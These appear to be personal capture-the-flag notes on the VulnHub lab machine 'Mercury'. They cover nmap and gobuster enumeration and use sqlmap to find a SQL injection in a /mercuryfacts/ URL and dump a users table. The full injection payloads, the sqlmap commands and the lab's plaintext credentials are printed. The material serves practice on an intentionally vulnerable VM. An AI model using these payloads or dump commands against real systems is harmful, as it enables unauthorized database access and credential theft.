#Planets #ThePlanets #VulnHub #Mercury 


- **Name**: The Planets: Earth
- **Date release**: 4 Sep 2020
- **Author**: [SirFlash](https://www.vulnhub.com/author/sirflash,731/)
- **Series**: [The Planets](https://www.vulnhub.com/series/the-planets,362/)

### Description

Difficulty: Easy

Mercury is an easier box, with no bruteforcing required. There are two flags on the box: a user and root flag which include an md5 hash. This has been tested on VirtualBox so may not work correctly on VMware. Any questions/issues or feedback please email me at: SirFlash at protonmail.com

### File Information

- **Filename**: Mercury.ova
- **File size**: 1.6 GB
- **MD5**: A25F4235486E2D9AF38EAA0E1CA23D45
- **SHA1**: 91B9717448620AFB0ED0FCC106D914BC0D1924BF

### Virtual Machine

- **Format**: Virtual Machine (Virtualbox - OVA)
- **Operating System**: Linux
### Networking

- **DHCP service**: Enabled
- **IP address**: Automatically assign


---
---

Change Network from Bridge to Host-Only
# Enumeration


## netdiscover

![[VulnHub - Hacking 👨‍💻/Mercury/netdiscover.png]]



## nmap

```shell
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV 192.168.56.115
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-04 16:49 CEST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 16:49 (0:00:06 remaining)
Nmap scan report for 192.168.56.115
Host is up (0.0022s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c8:24:ea:2a:2b:f1:3c:fa:16:94:65:bd:c7:9b:6c:29 (RSA)
|   256 e8:08:a1:8e:7d:5a:bc:5c:66:16:48:24:57:0d:fa:b8 (ECDSA)
|_  256 2f:18:7e:10:54:f7:b9:17:a2:11:1d:8f:b3:30:a5:2a (ED25519)
8080/tcp open  http-proxy WSGIServer/0.2 CPython/3.8.2
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: WSGIServer/0.2 CPython/3.8.2
| http-robots.txt: 1 disallowed entry 
|_/
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Sun, 04 Aug 2024 14:50:07 GMT
|     Server: WSGIServer/0.2 CPython/3.8.2
|     Content-Type: text/html
|     X-Frame-Options: DENY
|     Content-Length: 2366
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta http-equiv="content-type" content="text/html; charset=utf-8">
|     <title>Page not found at /nice ports,/Trinity.txt.bak</title>
|     <meta name="robots" content="NONE,NOARCHIVE">
|     <style type="text/css">
|     html * { padding:0; margin:0; }
|     body * { padding:10px 20px; }
|     body * * { padding:0; }
|     body { font:small sans-serif; background:#eee; color:#000; }
|     body>div { border-bottom:1px solid #ddd; }
|     font-weight:normal; margin-bottom:.4em; }
|     span { font-size:60%; color:#666; font-weight:normal; }
|     table { border:none; border-collapse: collapse; width:100%; }
|     vertical-align:
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sun, 04 Aug 2024 14:50:07 GMT
|     Server: WSGIServer/0.2 CPython/3.8.2
|     Content-Type: text/html; charset=utf-8
|     X-Frame-Options: DENY
|     Content-Length: 69
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     Hello. This site is currently in development please check back later.
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.94SVN%I=7%D=8/4%Time=66AF9511%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,135,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sun,\x2004\x20Aug\x2
SF:02024\x2014:50:07\x20GMT\r\nServer:\x20WSGIServer/0\.2\x20CPython/3\.8\
SF:.2\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nX-Frame-Options:\
SF:x20DENY\r\nContent-Length:\x2069\r\nX-Content-Type-Options:\x20nosniff\
SF:r\nReferrer-Policy:\x20same-origin\r\n\r\nHello\.\x20This\x20site\x20is
SF:\x20currently\x20in\x20development\x20please\x20check\x20back\x20later\
SF:.")%r(HTTPOptions,135,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sun,\x2004\x2
SF:0Aug\x202024\x2014:50:07\x20GMT\r\nServer:\x20WSGIServer/0\.2\x20CPytho
SF:n/3\.8\.2\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nX-Frame-Op
SF:tions:\x20DENY\r\nContent-Length:\x2069\r\nX-Content-Type-Options:\x20n
SF:osniff\r\nReferrer-Policy:\x20same-origin\r\n\r\nHello\.\x20This\x20sit
SF:e\x20is\x20currently\x20in\x20development\x20please\x20check\x20back\x2
SF:0later\.")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//
SF:DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x20\x20\"http://ww
SF:w\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x20\x20<head>\n\x2
SF:0\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Content-Type\"\x20co
SF:ntent=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<ti
SF:tle>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x2
SF:0<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\x2
SF:0\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20version\x20\('RTS
SF:P/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20ex
SF:planation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20request\x20syntax\
SF:x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\
SF:n")%r(FourOhFourRequest,A28,"HTTP/1\.1\x20404\x20Not\x20Found\r\nDate:\
SF:x20Sun,\x2004\x20Aug\x202024\x2014:50:07\x20GMT\r\nServer:\x20WSGIServe
SF:r/0\.2\x20CPython/3\.8\.2\r\nContent-Type:\x20text/html\r\nX-Frame-Opti
SF:ons:\x20DENY\r\nContent-Length:\x202366\r\nX-Content-Type-Options:\x20n
SF:osniff\r\nReferrer-Policy:\x20same-origin\r\n\r\n<!DOCTYPE\x20html>\n<h
SF:tml\x20lang=\"en\">\n<head>\n\x20\x20<meta\x20http-equiv=\"content-type
SF:\"\x20content=\"text/html;\x20charset=utf-8\">\n\x20\x20<title>Page\x20
SF:not\x20found\x20at\x20/nice\x20ports,/Trinity\.txt\.bak</title>\n\x20\x
SF:20<meta\x20name=\"robots\"\x20content=\"NONE,NOARCHIVE\">\n\x20\x20<sty
SF:le\x20type=\"text/css\">\n\x20\x20\x20\x20html\x20\*\x20{\x20padding:0;
SF:\x20margin:0;\x20}\n\x20\x20\x20\x20body\x20\*\x20{\x20padding:10px\x20
SF:20px;\x20}\n\x20\x20\x20\x20body\x20\*\x20\*\x20{\x20padding:0;\x20}\n\
SF:x20\x20\x20\x20body\x20{\x20font:small\x20sans-serif;\x20background:#ee
SF:e;\x20color:#000;\x20}\n\x20\x20\x20\x20body>div\x20{\x20border-bottom:
SF:1px\x20solid\x20#ddd;\x20}\n\x20\x20\x20\x20h1\x20{\x20font-weight:norm
SF:al;\x20margin-bottom:\.4em;\x20}\n\x20\x20\x20\x20h1\x20span\x20{\x20fo
SF:nt-size:60%;\x20color:#666;\x20font-weight:normal;\x20}\n\x20\x20\x20\x
SF:20table\x20{\x20border:none;\x20border-collapse:\x20collapse;\x20width:
SF:100%;\x20}\n\x20\x20\x20\x20td,\x20th\x20{\x20vertical-align:");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.11 seconds
```

---
---


### Open ports:

- 22/TCP - SSH
- 8080/TCP - HTTP-proxy


---

Check out the website http://192.168.56.115:8080/


#gobuster

`gobuster dir -u http://192.168.56.115:8080/ -w /usr/share/wordlists/dirb/common.txt`

![[gobuster.png]]

- You will find robots.txt

#### http://192.168.56.115:8080/robots.txt
```txt
User-agent: * 
Disallow: /
```


---
---
---

### Error - http://192.168.56.115:8080/*


![[PageNotFound.png]]





# Foothold 🦶



# Mercury Facts

![[Mercury_dev.png]]

There are 8 facts - http://192.168.56.115:8080/mercuryfacts/8/
```
Fact id: 1. (('Mercury does not have any moons or rings.',),)
Fact id: 2. (('Mercury is the smallest planet.',),)
Fact id: 3. (('Mercury is the closest planet to the Sun.',),)
Fact id: 4. (('Your weight on Mercury would be 38% of your weight on Earth.',),)
Fact id: 5. (('A day on the surface of Mercury lasts 176 Earth days.',),)
Fact id: 6. (('A year on Mercury takes 88 Earth days.',),)
Fact id: 7. (("It's not known who discovered Mercury.",),)
Fact id: 8. (('A year on Mercury is just 88 days long.',),)
```

http://192.168.56.115:8080/mercuryfacts/todo
```
Still todo:

- Add CSS.
- Implement authentication (using users table)
- Use models in django instead of direct mysql call
- All the other stuff, so much!!!
- 
```

---


## SQL MAP
#SQLmap #SQLInjection 

![[sqlmap.png]]


```sh
┌──(kali㉿kali)-[~]
└─$ sqlmap -u http://192.168.56.115:8080/mercuryfacts/1/
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8.2#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:56:37 /2024-08-04/

[18:56:38] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] y
[18:56:49] [INFO] testing connection to the target URL
[18:56:49] [INFO] checking if the target is protected by some kind of WAF/IPS
[18:56:49] [INFO] testing if the target URL content is stable
[18:56:49] [INFO] target URL content is stable
[18:56:49] [INFO] testing if URI parameter '#1*' is dynamic
[18:56:49] [WARNING] URI parameter '#1*' does not appear to be dynamic
[18:56:49] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
[18:56:49] [INFO] testing for SQL injection on URI parameter '#1*'
[18:56:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:56:50] [WARNING] reflective value(s) found and filtering out
[18:56:50] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:56:50] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                                                  
[18:56:50] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[18:56:50] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'                                                                                 
[18:56:50] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[18:56:50] [INFO] testing 'Generic inline queries'
[18:56:50] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[18:56:51] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[18:56:51] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[18:56:51] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[18:56:51] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[18:56:51] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[18:56:51] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] y
[18:57:12] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:57:12] [WARNING] URI parameter '#1*' does not seem to be injectable
[18:57:12] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[18:57:12] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 73 times
[18:57:12] [WARNING] your sqlmap version is outdated

[*] ending @ 18:57:12 /2024-08-04/
```

### try again with different command 
 `sqlmap -u http://192.168.56.115:8080/mercuryfacts/ --dbs --batch`


```sh
                                                                                          
┌──(kali㉿kali)-[~]
└─$ sqlmap -u http://192.168.56.115:8080/mercuryfacts/ --dbs --batch
        ___
       __H__                                                                                        
 ___ ___[(]_____ ___ ___  {1.8.2#stable}                                                            
|_ -| . [.]     | .'| . |                                                                           
|___|_  [,]_|_|_|__,|  _|                                                                           
      |_|V...       |_|   https://sqlmap.org                                                        

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:00:56 /2024-08-04/

[19:00:56] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'              
do you want to try URI injections in the target URL itself? [Y/n/q] Y
[19:00:56] [INFO] testing connection to the target URL
[19:00:57] [INFO] checking if the target is protected by some kind of WAF/IPS
[19:00:57] [INFO] testing if the target URL content is stable
[19:00:57] [INFO] target URL content is stable
[19:00:57] [INFO] testing if URI parameter '#1*' is dynamic
got a 301 redirect to 'http://192.168.56.115:8080/mercuryfacts/7112/'. Do you want to follow? [Y/n] Y
[19:00:57] [INFO] URI parameter '#1*' appears to be dynamic
[19:00:58] [INFO] heuristic (basic) test shows that URI parameter '#1*' might be injectable (possible DBMS: 'MySQL')
[19:00:59] [INFO] testing for SQL injection on URI parameter '#1*'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[19:00:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:01:00] [WARNING] reflective value(s) found and filtering out
[19:01:03] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[19:01:03] [INFO] testing 'Generic inline queries'
[19:01:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[19:01:11] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[19:01:20] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'                       
[19:01:28] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'                
[19:01:40] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[19:01:54] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[19:02:11] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[19:02:24] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[19:02:39] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[19:02:52] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[19:03:10] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[19:03:10] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[19:03:10] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[19:03:10] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[19:03:10] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[19:03:10] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[19:03:10] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[19:03:11] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[19:03:11] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[19:03:11] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[19:03:11] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[19:03:20] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[19:03:20] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[19:03:28] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[19:03:36] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[19:03:44] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[19:03:52] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[19:04:00] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[19:04:07] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[19:04:15] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[19:04:23] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[19:04:31] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[19:04:40] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[19:04:47] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[19:04:55] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[19:05:03] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[19:05:12] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[19:05:21] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[19:05:31] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[19:05:35] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[19:05:42] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[19:05:42] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[19:05:42] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[19:05:42] [INFO] URI parameter '#1*' is 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)' injectable 
[19:05:42] [INFO] testing 'MySQL inline queries'
[19:05:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[19:05:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[19:05:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[19:05:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[19:05:42] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[19:05:43] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[19:05:43] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[19:05:43] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[19:05:43] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[19:05:43] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[19:05:43] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[19:05:43] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
[19:05:43] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[19:05:43] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[19:05:43] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
[19:05:43] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
[19:05:44] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)'
[19:05:44] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query)'
[19:05:44] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)'
[19:05:44] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)'
[19:05:44] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)'
[19:05:44] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)'
[19:05:44] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[19:05:44] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
[19:05:44] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[19:05:44] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
[19:05:44] [INFO] testing 'MySQL AND time-based blind (ELT)'
[19:05:45] [INFO] testing 'MySQL OR time-based blind (ELT)'
[19:05:45] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
[19:05:45] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
[19:05:45] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[19:05:45] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[19:05:45] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[19:06:45] [INFO] URI parameter '#1*' appears to be 'MySQL >= 5.0.12 time-based blind - Parameter replace' injectable 
[19:06:45] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[19:06:45] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[19:06:49] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[19:06:52] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[19:06:56] [INFO] target URL appears to be UNION injectable with 1 columns
[19:06:56] [INFO] URI parameter '#1*' is 'MySQL UNION query (random number) - 1 to 20 columns' injectable
URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 1872 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: error-based
    Title: MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)
    Payload: http://192.168.56.115:8080/mercuryfacts/GTID_SUBSET(CONCAT(0x716b767871,(SELECT (ELT(9891=9891,1))),0x71766a7871),9891)

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace
    Payload: http://192.168.56.115:8080/mercuryfacts/(CASE WHEN (8915=8915) THEN SLEEP(5) ELSE 8915 END)

    Type: UNION query
    Title: MySQL UNION query (random number) - 1 column
    Payload: http://192.168.56.115:8080/mercuryfacts/-3192 UNION ALL SELECT CONCAT(0x716b767871,0x746a6d5664444176446b4e685043685353685756496a4650417650784c57636967545a69414d596b,0x71766a7871)#
---
[19:06:56] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.6
[19:06:57] [INFO] fetching database names
available databases [2]:
[*] information_schema
[*] mercury

[19:06:57] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.56.115'
[19:06:57] [WARNING] your sqlmap version is outdated

[*] ending @ 19:06:57 /2024-08-04/

```


There is two databases
- information_schema
- mercury


---

### Access the database
 `sqlmap -u http://192.168.56.115:8080/mercuryfacts/ -D mercury --dump-all --batch`


```sh
┌──(kali㉿kali)-[~]
└─$ sqlmap -u http://192.168.56.115:8080/mercuryfacts/ -D mercury --dump-all --batch
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8.2#stable}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:37:01 /2024-08-04/

[19:37:01] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] Y
[19:37:01] [INFO] resuming back-end DBMS 'mysql' 
[19:37:01] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: error-based
    Title: MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)
    Payload: http://192.168.56.115:8080/mercuryfacts/GTID_SUBSET(CONCAT(0x716b767871,(SELECT (ELT(9891=9891,1))),0x71766a7871),9891)

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace
    Payload: http://192.168.56.115:8080/mercuryfacts/(CASE WHEN (8915=8915) THEN SLEEP(5) ELSE 8915 END)

    Type: UNION query
    Title: MySQL UNION query (random number) - 1 column
    Payload: http://192.168.56.115:8080/mercuryfacts/-3192 UNION ALL SELECT CONCAT(0x716b767871,0x746a6d5664444176446b4e685043685353685756496a4650417650784c57636967545a69414d596b,0x71766a7871)#
---
[19:37:01] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.6
[19:37:01] [INFO] fetching tables for database: 'mercury'
got a 301 redirect to 'http://192.168.56.115:8080/mercuryfacts/-9885%20UNION%20ALL%20SELECT%20CONCAT(0x716b767871,JSON_ARRAYAGG(CONCAT_WS(0x66626b666964,table_name)),0x71766a7871)%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20IN%20(0x6d657263757279)%23/'. Do you want to follow? [Y/n] Y
[19:37:01] [WARNING] reflective value(s) found and filtering out
[19:37:01] [INFO] fetching columns for table 'users' in database 'mercury'
[19:37:01] [INFO] fetching entries for table 'users' in database 'mercury'
Database: mercury
Table: users
[4 entries]
+----+-------------------------------+-----------+
| id | password                      | username  |
+----+-------------------------------+-----------+
| 1  | johnny1987                    | john      |
| 2  | lovemykids111                 | laura     |
| 3  | lovemybeer111                 | sam       |
| 4  | mercuryisthesizeof0.056Earths | webmaster |
+----+-------------------------------+-----------+

[19:37:01] [INFO] table 'mercury.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.56.115/dump/mercury/users.csv'                                              
[19:37:01] [INFO] fetching columns for table 'facts' in database 'mercury'
[19:37:01] [INFO] fetching entries for table 'facts' in database 'mercury'
[19:37:02] [INFO] retrieved: 'Mercury does not have any moons or rings.','1'
[19:37:02] [INFO] retrieved: 'Mercury is the smallest planet.','2'
[19:37:02] [INFO] retrieved: 'Mercury is the closest planet to the Sun.','3'
[19:37:02] [INFO] retrieved: 'Your weight on Mercury would be 38% of your weight on Eart...
[19:37:02] [INFO] retrieved: 'A day on the surface of Mercury lasts 176 Earth days.','5'
[19:37:02] [INFO] retrieved: 'A year on Mercury takes 88 Earth days.','6'
[19:37:02] [INFO] retrieved: 'It's not known who discovered Mercury.','7'
[19:37:02] [INFO] retrieved: 'A year on Mercury is just 88 days long.','8'
Database: mercury                                                                         
Table: facts
[8 entries]
+----+--------------------------------------------------------------+
| id | fact                                                         |
+----+--------------------------------------------------------------+
| 1  | Mercury does not have any moons or rings.                    |
| 2  | Mercury is the smallest planet.                              |
| 3  | Mercury is the closest planet to the Sun.                    |
| 4  | Your weight on Mercury would be 38% of your weight on Earth. |
| 5  | A day on the surface of Mercury lasts 176 Earth days.        |
| 6  | A year on Mercury takes 88 Earth days.                       |
| 7  | It's not known who discovered Mercury.                       |
| 8  | A year on Mercury is just 88 days long.                      |
+----+--------------------------------------------------------------+

[19:37:02] [INFO] table 'mercury.facts' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.56.115/dump/mercury/facts.csv'                                              
[19:37:02] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/192.168.56.115'                                                                      
[19:37:02] [WARNING] your sqlmap version is outdated

[*] ending @ 19:37:02 /2024-08-04/

```

